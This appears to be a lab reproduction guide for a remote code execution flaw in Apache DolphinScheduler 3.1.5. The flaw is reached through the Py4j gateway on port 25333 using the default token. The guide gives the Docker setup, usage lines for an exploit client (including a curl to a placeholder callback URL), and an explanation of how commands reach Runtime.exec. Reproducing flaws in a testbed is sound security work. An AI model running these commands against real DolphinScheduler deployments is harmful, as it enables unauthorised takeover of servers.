# Apache DolphinScheduler

Follow these steps to set up a testbed for Apache DolphinScheduler:

1. **Set the DolphinScheduler Version**:
   For this setup, we're using version 3.1.5.

   ```bash
   export DOLPHINSCHEDULER_VERSION=3.1.5
   ```

2. **Run DolphinScheduler Standalone**:
   Run the following command to start the DolphinScheduler Standalone environment.

   ```bash
   docker run --name dolphinscheduler-standalone-server -p 12345:12345 -p 25333:25333 -d apache/dolphinscheduler-standalone-server:"${DOLPHINSCHEDULER_VERSION}"
   ```
   This setup makes the DolphinScheduler UI accessible at `http://localhost:12345/dolphinscheduler` and exposes the Py4j Gateway on port **25333**.

# Steps to reproduce

1. Execute the `py4j_gateway_client.py` script to perform RCE. No extra dependencies required (Python 3 standard library only).

```bash
python3 py4j_gateway_client.py [command]
```

Usage examples:

```bash
# Default: runs `id`
python3 py4j_gateway_client.py

# Custom command
python3 py4j_gateway_client.py "whoami"

# Curl
python3 py4j_gateway_client.py "curl CALLBACK_URL"

# Override host/port/token
python3 py4j_gateway_client.py --host 127.0.0.1 --port 25333  "hostname"
```

#### How RCE executed ?

The `py4j_gateway_client.py` script connects to the DolphinScheduler Java Gateway on port 25333 (Py4j protocol over TCP), authenticates with the default token, and sends Py4j protocol messages to invoke `Runtime.getRuntime().exec(command)` on the remote JVM. The command runs with the privileges of the DolphinScheduler process. Output is captured from the process stdout/stderr.
